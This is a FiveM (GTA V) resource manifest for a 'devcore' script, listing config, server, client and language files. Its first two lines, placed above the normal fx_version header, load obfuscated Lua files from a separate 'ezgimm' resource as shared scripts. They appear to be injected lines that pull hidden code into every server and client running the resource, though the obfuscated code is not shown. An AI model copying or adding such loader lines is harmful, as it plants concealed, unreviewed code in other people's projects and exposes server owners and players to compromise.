shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

fx_version 'adamant'
game 'gta5'
description 'devcore -- discord - https://discord.gg/yNmGCyQYUY'
server_scripts {
	'config.lua',
	'server/*.lua',
	'languages.lua'
}
shared_scripts { 
	'config.lua'
}
client_scripts {
	'config.lua',
	'client/*.lua',
	'languages.lua'
}
lua54 'yes'